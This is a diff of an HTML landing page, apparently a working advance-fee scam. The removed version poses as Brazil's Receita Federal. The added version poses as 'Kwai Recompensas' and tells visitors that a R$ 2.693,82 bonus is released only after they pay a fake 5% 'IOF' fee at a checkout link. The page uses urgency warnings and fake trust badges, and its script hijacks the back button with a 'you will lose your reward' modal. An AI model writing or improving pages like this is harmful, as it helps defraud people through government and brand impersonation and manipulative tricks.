@@ -1,121 +1,118 @@
-<!DOCTYPE html><html lang="pt-br"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cálculo de IOF - Receita Federal</title>
-    <link rel="stylesheet" href="css/style.css">
-<script
-	src="https://cdn.xtracky.com/scripts/utm-handler.js"
-	data-token="abc60e07-8140-4133-b5df-23c871ba9de6"
->
-</script>
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Kwai Recompensas - Liberação de Saldo</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:"Inter",-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(135deg,#0963a8 0%,#064a7a 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#333;line-height:1.5}
+.container{max-width:420px;width:100%;text-align:center}
+.card{background:#fff;border-radius:20px;padding:25px 20px;box-shadow:0 15px 35px rgba(0,0,0,0.15);margin-bottom:15px}
+.card h1{font-size:20px;font-weight:700;color:#111;margin-bottom:5px}
+.card .sub{font-size:13px;color:#888;margin-bottom:20px}
+.badge{display:inline-block;background:rgba(9,99,168,0.1);color:#0963a8;font-size:11px;font-weight:700;padding:4px 12px;border-radius:20px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:15px}
+.info-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #f0f0f0;font-size:15px}
+.info-row:last-child{border-bottom:none}
+.info-row .label{color:#666;font-weight:500}
+.info-row .value{font-weight:700;color:#111}
+.info-row .value.green{color:#27ae60}
+.result-row{background:linear-gradient(135deg,#f0f7ff,#e8f4fd);border:1px solid #cce5ff;border-radius:12px;padding:15px;margin:20px 0;display:flex;justify-content:space-between;align-items:center}
+.result-row .lbl{font-size:11px;font-weight:700;color:#0056b3;text-transform:uppercase;letter-spacing:.5px}
+.result-row .val{font-size:28px;font-weight:800;color:#000}
+.alert-box{background:#fff4e5;border-left:5px solid #ffa000;border-radius:8px;padding:15px;margin:20px 0;text-align:left;font-size:13px;color:#663c00;line-height:1.5}
+.alert-box strong{display:block;color:#333;margin-bottom:3px;text-transform:uppercase;font-size:12px}
+.cta-button{background:linear-gradient(135deg,#0963a8,#064a7a);color:#fff;border:none;border-radius:50px;width:100%;padding:16px;font-size:16px;font-weight:700;cursor:pointer;transition:all .3s ease;box-shadow:0 8px 25px rgba(9,99,168,0.4);text-transform:uppercase;letter-spacing:.5px;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;animation:pulse-cta 2.5s infinite;touch-action:manipulation;-webkit-appearance:none}
+.cta-button:active{transform:scale(0.98)}
+@keyframes pulse-cta{0%,100%{box-shadow:0 8px 25px rgba(9,99,168,0.4)}50%{box-shadow:0 10px 30px rgba(9,99,168,0.6)}}
+.trust-badge{display:inline-block;background:rgba(9,99,168,0.1);color:#0963a8;padding:6px 12px;border-radius:15px;font-size:11px;font-weight:600;border:1px solid rgba(9,99,168,0.2);margin:4px}
+.sucesso-screen{display:none;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}
+.sucesso-screen .icon{font-size:64px;margin-bottom:20px}
+.sucesso-screen h1{font-size:28px;font-weight:800;color:#fff;margin-bottom:10px}
+.sucesso-screen p{font-size:16px;color:rgba(255,255,255,0.8);margin-bottom:5px}
+.sucesso-screen .sub{font-size:14px;color:rgba(255,255,255,0.6)}
+</style>
+<script src="https://cdn.xtracky.com/scripts/utm-handler.js" data-token="abc60e07-8140-4133-b5df-23c871ba9de6"></script>
 </head>
 <body>
 
-    <header class="main-header">
-        <div class="container">
-            <div class="logo-area">
-                <img src="images/logo.png" alt="Receita Federal" class="logo">
-                <div class="brand-text">
-                    <span class="title">Serviços do Contribuinte</span>
-                    <span class="subtitle">Portal de Serviços da Receita</span>
-                </div>
-            </div>
-        </div>
-    </header>
+<div class="container" id="pagina-principal">
+  <div class="card">
+    <span class="badge">IOF sobre o bonus</span>
+    <h1>Liberação de Saldo</h1>
+    <p class="sub">Regularização fiscal para liberação do montante</p>
 
-    <main class="container">
-        <div class="top-info">
-            <span class="category-tag">IOF sobre o bônus</span>
-        </div>
-
-        <section class="hero">
-            <h1>Resumo do Tributo</h1>
-            <p>Detalhamento da alíquota aplicada para fins de regularização.</p>
-        </section>
-
-        <div class="calculator-card">
-            <div class="calc-header">Memória de Cálculo</div>
-            
-            <div class="calc-row">
-                <span>Valor do Bônus:</span>
-                <span class="value">R$ 2.693,82</span>
-            </div>
-            
-            <div class="calc-row">
-                <span>Alíquota de IOF:</span>
-                <span class="value badge-blue">5%</span>
-            </div>
-
-            <hr class="divider">
-
-            <div class="calc-row result">
-                <span>Total a recolher:</span>
-                <span class="value highlight" id="taxa-resultado">R$ 134,69</span>
-            </div>
-
-            <a href="/checkout/6/" class="btn-gov" style="text-decoration:none;">
-                Gerar DARF para pagamento
-            </a>
-        </div>
-    </main>
-        <div class="alert-box">
-    <div class="alert-icon">⚠️</div>
-    <div class="alert-content">
-        <strong>Atenção:</strong> A liberação do montante principal está condicionada à liquidação integral da guia acima. 
-        O descumprimento do prazo de recolhimento impossibilita o processamento e a transferência definitiva dos valores para a conta de destino.
+    <div class="info-row">
+      <span class="label">Valor do Bonus</span>
+      <span class="value" id="valor-bonus">R$ 2.693,82</span>
     </div>
+    <div class="info-row">
+      <span class="label">Aliquota de IOF</span>
+      <span class="value green">5%</span>
     </div>
 
-    <footer class="main-footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h4>Portal de Serviços</h4>
-                    <ul>
-                        <li><a href="#">Privacidade</a></li>
-                        <li><a href="#">Termos de Uso</a></li>
-                        <li><a href="#">Acessibilidade</a></li>
-                    </ul>
-                </div>
-                <div class="footer-logo">
-                    <img src="images/logo.png" alt="Logo Receita Federal" class="footer-img">
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>© 2026 Secretaria da Receita Federal do Brasil. Todos os direitos reservados.</p>
-            </div>
-        </div>
-    </footer>
+    <div class="result-row">
+      <div>
+        <div class="lbl">Total a recolher</div>
+        <div class="val" id="total-recolher">R$ 134,69</div>
+      </div>
+    </div>
 
-    <script src="js/script.js"></script>
+    <div class="alert-box">
+      <strong>ATENCAO</strong>
+      A liberacao do montante principal esta condicionada a liquidacao integral da guia acima. O descumprimento do prazo de recolhimento impossibilita o processamento e a transferencia definitiva dos valores.
+    </div>
 
+    <a href="/checkout/6/" class="cta-button"><i class="bx bx-barcode"></i> PAGAR TAXA E LIBERAR SALDO</a>
+
+    <div style="margin-top:15px">
+      <span class="trust-badge"><i class="bx bx-lock-alt"></i> Pagamento seguro</span>
+      <span class="trust-badge"><i class="bx bx-check-shield"></i> Dados protegidos</span>
+    </div>
+  </div>
+</div>
+
+<div class="sucesso-screen" id="tela-sucesso">
+  <div class="icon">&#127881;</div>
+  <h1>Parabens!</h1>
+  <p>Todos os pagamentos foram concluidos com sucesso.</p>
+  <p class="sub">Seu saldo foi liberado!</p>
+</div>
 
 <!-- Modal Back Redirect -->
 <div id="overlay-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:99999;justify-content:center;align-items:center;">
-  <div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:90%;text-align:center;font-family:sans-serif;">
-    <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+  <div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:90%;text-align:center;">
+    <div style="font-size:2rem;margin-bottom:12px;">&#9888;&#65039;</div>
     <h2 style="font-size:1.2rem;margin-bottom:8px;color:#111;">Tem certeza que quer sair?</h2>
-    <p style="color:#555;font-size:0.9rem;margin-bottom:20px;">Seu saldo será cancelado e você perderá sua recompensa!</p>
-    <button id="btn-finalizar" style="width:100%;padding:14px;background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px;">✅ Continuar e Resgatar</button>
+    <p style="color:#555;font-size:0.9rem;margin-bottom:20px;">Seu saldo sera cancelado e voce perdera sua recompensa!</p>
+    <button id="btn-finalizar" style="width:100%;padding:14px;background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px;">&#10004;&#65039; Continuar e Resgatar</button>
     <button id="btn-sair" style="width:100%;padding:12px;background:none;border:none;color:#999;font-size:0.85rem;cursor:pointer;">Sair mesmo assim</button>
   </div>
 </div>
+
 <script>
-document.addEventListener("DOMContentLoaded", function () {
-  var p = new URLSearchParams(window.location.search);
-  if (p.get('sucesso') === '1') {
-    document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;padding:20px;text-align:center"><div style="font-size:64px;margin-bottom:20px">🎉</div><h1 style="font-size:28px;margin-bottom:10px">Parabéns!</h1><p style="font-size:16px;color:rgba(255,255,255,0.8);margin-bottom:5px">Todos os pagamentos foram concluídos com sucesso.</p><p style="font-size:14px;color:rgba(255,255,255,0.6)">Seu saldo foi liberado!</p></div>';
+document.addEventListener("DOMContentLoaded", function() {
+  var params = new URLSearchParams(window.location.search);
+  if (params.get('sucesso') === '1') {
+    document.getElementById('pagina-principal').style.display = 'none';
+    document.getElementById('tela-sucesso').style.display = 'flex';
     return;
   }
+
+  var bonus = 2693.82;
+  var taxa = bonus * 0.05;
+  document.getElementById('total-recolher').textContent = 'R$ ' + taxa.toFixed(2).replace('.', ',');
+  document.getElementById('valor-bonus').textContent = 'R$ ' + bonus.toFixed(2).replace('.', ',');
+
   history.pushState(null, null, location.href);
-  window.addEventListener("popstate", function () {
+  window.addEventListener("popstate", function() {
     history.pushState(null, null, location.href);
     document.getElementById("overlay-modal").style.display = "flex";
   });
-  document.getElementById("btn-finalizar").addEventListener("click", function () {
+  document.getElementById("btn-finalizar").addEventListener("click", function() {
     document.getElementById("overlay-modal").style.display = "none";
   });
-  document.getElementById("btn-sair").addEventListener("click", function () {
+  document.getElementById("btn-sair").addEventListener("click", function() {
     window.history.back();
   });
 });
